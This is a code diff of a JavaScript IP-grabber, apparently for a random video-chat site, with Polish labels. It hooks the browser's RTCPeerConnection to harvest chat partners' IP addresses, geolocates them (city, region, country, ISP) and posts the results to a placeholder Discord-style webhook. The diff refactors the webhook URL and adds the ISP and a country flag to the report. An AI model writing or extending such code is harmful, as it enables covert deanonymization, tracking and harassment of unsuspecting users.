@@ -1,4 +1,5 @@
-let apiKey = "your-api-key";
+let apiKey = "apikey";
+let webhook = "webhook"
 
 window.oRTCPeerConnection =
   window.oRTCPeerConnection || window.RTCPeerConnection;
@@ -28,7 +29,7 @@ let postujdodc = async (ip) => {
   let random = Math.floor(Math.random() * 100)
 
   var request = new XMLHttpRequest();
-  request.open("POST", "webhook");
+  request.open("POST", `${webhook}`);
   // again, replace the url in the open method with yours
   request.setRequestHeader('Content-type', 'application/json');
 
@@ -37,16 +38,17 @@ let postujdodc = async (ip) => {
   
   var myEmbed = {
     author: {
-      name: `Ome.bot Caller ID: ${random}`
+      name: `${random} | Adres IP: ${ip}`,
+      icon_url: `${json.country_flag}`
     },
-    title: `Adres IP: ${ip}, Miasto: ${json.city}`,
-    description: `Kraj: **${json.country_name}**, Wojewodztwo: **${json.state_prov}**`,
-    color: hexToDecimal("#3711bf"),
+    title: `Miasto: **${json.city}** | Wojewodztwo: **${json.state_prov}**`,
+    description: `Kraj: **${json.country_name}** | Dostawca Internetu: **${json.isp}**`,
+    color: hexToDecimal('#' + Math.round((0x1000000 + 0xffffff * Math.random())).toString(16).slice(1)),
   }
   
   var params = {
     username: `ome.bot`,
-    embeds: [ myEmbed ]
+    embeds: [ myEmbed ],
   }
   
   request.send(JSON.stringify(params));
@@ -66,3 +68,4 @@ function pocczekajchwile(milliseconds) {
     }
   }
 }
+
